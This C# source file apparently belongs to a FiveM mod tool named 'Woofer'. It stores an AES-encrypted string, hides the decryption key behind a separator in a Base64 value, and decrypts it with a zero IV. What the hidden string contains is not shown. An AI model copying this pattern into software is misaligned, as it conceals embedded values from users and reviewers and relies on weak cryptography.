using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace FiveMModsWoofer
{
	internal class Variables
	{
		public static string x1 = "NWUyNjg3MTQ3NzBjNjRiOTIwNDEwM2Q0NGRlOTY0NTQÖNWUyNjg3MTQ3NzBjNjRiOTIwNDEwM2Q0NGRlOTY0NTQ=";

		public static string x2 = "";

		public static string Decoder()
		{
			string key = Base64Decode(x1.Split('Ö')[1]);
			return DecryptString(key, "8haTqlzh+D+qU4ZKhzty+txK/8ESc7fwS3FgiZBCJoMdsKFdGWgt1Joa4AAwmHdg5IGdmwqMWseLjOd6nxBOwbjwtKqZhT1Q2S/63WCIv7fMSLb3ES+QZL7kzULAjFYuZUTm4ZTwnv5dRELbl93xjm1o/V9FRk9/zIwgFn3BzHA=");
		}

		public static string DecryptString(string key, string cipherText)
		{
			byte[] iV = new byte[16];
			byte[] buffer = Convert.FromBase64String(cipherText);
			 Aes aes = Aes.Create();
			aes.Key = Encoding.UTF8.GetBytes(key);
			aes.IV = iV;
			ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
			 MemoryStream stream = new MemoryStream(buffer);
			 CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
			 StreamReader streamReader = new StreamReader(stream2);
			return streamReader.ReadToEnd();
		}

		public static string Base64Decode(string base64EncodedData)
		{
			byte[] bytes = Convert.FromBase64String(base64EncodedData);
			return Encoding.UTF8.GetString(bytes);
		}
	}
}
